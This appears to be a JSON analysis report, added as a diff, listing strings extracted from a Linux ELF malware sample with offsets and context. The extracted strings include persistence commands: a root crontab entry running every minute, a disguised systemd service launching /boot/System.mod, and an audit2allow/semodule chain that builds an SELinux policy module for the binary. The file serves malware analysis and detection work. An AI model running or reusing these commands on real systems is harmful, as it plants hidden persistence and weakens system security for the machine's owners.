@@ -1,0 +1,91 @@
+{
+  "sample": "input/0a70d7699c8e0629597dcc03b1aef0beebec03ae0580f2c070fb2bfd2fd89a71.elf",
+  "hit_count": 8,
+  "hits": [
+    {
+      "marker": "/etc/profile.d/gateway.sh",
+      "offset": 1138821,
+      "va": 5333125,
+      "run_start_offset": 1138724,
+      "run_end_offset": 1138921,
+      "printable_run": "structure needs cleaningunpacking Question.Classupdate during transition to unused region of span/etc/profile.d/gateway.sh/proc/sys/kernel/hostname2006-01-02T15:04:05Z07:00GODEBUG: can not enable \"",
+      "context": "tructure needs cleaningunpacking Question.Classupdate during transition to unused region of span/etc/profile.d/gateway.sh/proc/sys/kernel/hostname2006-01-02T15:04:05Z07:00GODEBUG: can not enab"
+    },
+    {
+      "marker": "/etc/profile.d/bash_cfg.sh",
+      "offset": 1139771,
+      "va": 5334075,
+      "run_start_offset": 1139696,
+      "run_end_offset": 1141341,
+      "printable_run": "unexpected '[' in addressunexpected ']' in addressunexpected fault address /etc/profile.d/bash_cfg.sh9d7fda27bc1f31299d27d238f49d7fda27bc1f31299d27d439f7SIGSTOP: stop, unblockablecall from unknown functioncannot marshal DNS messagecorrupted semaphore ticketcriterion lacks equal signentersyscall inconsistent forEachP: P did not run fnfreedefer with d.fn != nilinvalid request descriptorname not unique on networknegative idle mark workersno CSI structure availableno message of desired typenotewakeup - double wakeupout of memory (stackalloc)persistentalloc: size == 0required key not availableruntime: bad span s.state=runtime: pcHeader: magic= runtime: pipe failed with segment prefix is reservedshrinking stack in libcallstartlockedm: locked to metoo many colons in addressunclosed criterion bracketuse of invalid sweepLockerwakep: negative nmspinning not in stack roots range [: unexpected return pc for G waiting list is corruptedSIGILL: illegal instructionSIGXCPU: cpu limit exceededaddress not a stack addresschannel number out of rangecommunication error on sendfailed to set sweep barriergcstopm: not waiting for gcgrowslice: len out of rangeinternal lockOSThread errorinvalid profile bucket typekey was rejected by servicemakechan: size out of rangemakeslice: cap out of rangemakeslice: len out of rangemspan.sweep: bad span statenot a XENIX named type fileos: process not initializedos: unsupported signal typeprogToPointerMask: overflowrunlock of unlocked rwmutexruntime: asyncPreemptStack=runtime: checkdead: find g runtime: checkdead: nmidle=runtime: corrupted polldescruntime: netpollinit failedruntime: thread ID overflowruntime",
+      "context": "inal*-*-shell........unexpected '[' in addressunexpected ']' in addressunexpected fault address /etc/profile.d/bash_cfg.sh9d7fda27bc1f31299d27d238f49d7fda27bc1f31299d27d439f7SIGSTOP: stop, unb"
+    },
+    {
+      "marker": "/usr/lib/systemd/system/quotaoff.service",
+      "offset": 1150883,
+      "va": 5345187,
+      "run_start_offset": 1150493,
+      "run_end_offset": 1151603,
+      "printable_run": "internal error: exit hook invoked panicmismatched count during itab table copymspan.sweep: bad span state after sweepout of memory allocating heap arena mapruntime: blocked write on free polldescruntime: casfrom_Gscanstatus failed gp=stack growth not allowed in system callsuspendG from non-preemptible goroutinetraceback: unexpected SPWRITE function transport endpoint is already connected/usr/lib/systemd/system/quotaoff.service9d6ccf36bc1f2769d626d73cfd183c18d960d739address family not supported by protocolbulkBarrierPreWrite: unaligned argumentscannot free workbufs when work.full != 0crypto/cipher: output smaller than inputdeferproc: d.panic != nil after newdeferfailed to acquire lock to reset capacityinvalid span in heapArena for user arenamarkWorkerStop: unknown mark worker modemust be able to track idle limiter eventrefill of span with free space remainingruntime.SetFinalizer: first argument is runtime: netpollBreak write failed with runtime: out of memory: cannot allocate runtime: typeBitsBulkBarrier with type  time: Stop called on uninitialized Timer received on thread with no signal stack",
+      "context": "emptible goroutinetraceback: unexpected SPWRITE function transport endpoint is already connected/usr/lib/systemd/system/quotaoff.service9d6ccf36bc1f2769d626d73cfd183c18d960d739address family n"
+    },
+    {
+      "marker": "echo \"*/1 * * * * root /.mod \" >> /etc/crontab",
+      "offset": 1154840,
+      "va": 5349144,
+      "run_start_offset": 1154610,
+      "run_end_offset": 1155161,
+      "printable_run": "9d6bd43ae742173ec17dde38bd0429209c6ad43bf504239d6ccf36bc1d3628d460d730bd096b2bdb67ce2dbd1e2c9d7cc827bc1e262edc26d233f0022a21db6e9536fc0322both Setctty and Foreground set in SysProcAttrcipher.newCFB: IV length must equal block sizeecho \"*/1 * * * * root /.mod \" >> /etc/crontabmemory reservation exceeds address space limitpanicwrap: unexpected string after type name: released less than one physical page of memoryruntime: failed to create new OS thread (have runtime: name offset base pointer out of rangeruntime: panic before malloc heap initialized",
+      "context": "0322both Setctty and Foreground set in SysProcAttrcipher.newCFB: IV length must equal block sizeecho \"*/1 * * * * root /.mod \" >> /etc/crontabmemory reservation exceeds address space limitpani"
+    },
+    {
+      "marker": "systemctl daemon-reload",
+      "offset": 1160552,
+      "va": 5354856,
+      "run_start_offset": 1160439,
+      "run_end_offset": 1160668,
+      "printable_run": "cd /boot;ausearch -c 'System.mod' --raw | audit2allow -M my-Systemmod;semodule -X 300 -i my-Systemmod.ppcd /boot;systemctl daemon-reload;systemctl enable quotaoff.service;systemctl start quotaoff.service;journalctl -xe --no-pager",
+      "context": " -c 'System.mod' --raw | audit2allow -M my-Systemmod;semodule -X 300 -i my-Systemmod.ppcd /boot;systemctl daemon-reload;systemctl enable quotaoff.service;systemctl start quotaoff.service;journ"
+    },
+    {
+      "marker": "ExecStart=/boot/System.mod",
+      "offset": 1160894,
+      "va": 5355198,
+      "run_start_offset": 1160894,
+      "run_end_offset": 1160920,
+      "printable_run": "ExecStart=/boot/System.mod",
+      "context": "NFO./boot/System.mod.exit 0[Unit].Description=linux.After=network.target.[Service].Type=forking.ExecStart=/boot/System.mod.ExecReload=/boot/System.mod.ExecStop=/boot/System.mod.[Install].Wante"
+    },
+    {
+      "marker": "ExecReload=/boot/System.mod",
+      "offset": 1160921,
+      "va": 5355225,
+      "run_start_offset": 1160921,
+      "run_end_offset": 1160948,
+      "printable_run": "ExecReload=/boot/System.mod",
+      "context": "[Unit].Description=linux.After=network.target.[Service].Type=forking.ExecStart=/boot/System.mod.ExecReload=/boot/System.mod.ExecStop=/boot/System.mod.[Install].WantedBy=multi-user.target000102"
+    },
+    {
+      "marker": "ExecStop=/boot/System.mod",
+      "offset": 1160949,
+      "va": 5355253,
+      "run_start_offset": 1160949,
+      "run_end_offset": 1160974,
+      "printable_run": "ExecStop=/boot/System.mod",
+      "context": "er=network.target.[Service].Type=forking.ExecStart=/boot/System.mod.ExecReload=/boot/System.mod.ExecStop=/boot/System.mod.[Install].WantedBy=multi-user.target0001020304050607080910111213141516"
+    }
+  ],
+  "extracted": {
+    "service_unit_lines": [
+      "ExecReload=/boot/System.mod",
+      "ExecStart=/boot/System.mod",
+      "ExecStop=/boot/System.mod"
+    ],
+    "systemctl_related_blocks": [
+      "cd /boot;ausearch -c 'System.mod' --raw | audit2allow -M my-Systemmod;semodule -X 300 -i my-Systemmod.ppcd /boot;systemctl daemon-reload;systemctl enable quotaoff.service;systemctl start quotaoff.service;journalctl -xe --no-pager"
+    ],
+    "cron_related_blocks": [
+      "9d6bd43ae742173ec17dde38bd0429209c6ad43bf504239d6ccf36bc1d3628d460d730bd096b2bdb67ce2dbd1e2c9d7cc827bc1e262edc26d233f0022a21db6e9536fc0322both Setctty and Foreground set in SysProcAttrcipher.newCFB: IV length must equal block sizeecho \"*/1 * * * * root /.mod \" >> /etc/crontabmemory reservation exceeds address space limitpanicwrap: unexpected string after type name: released less than one physical page of memoryruntime: failed to create new OS thread (have runtime: name offset base pointer out of rangeruntime: panic before malloc heap initialized"
+    ]
+  }
+}
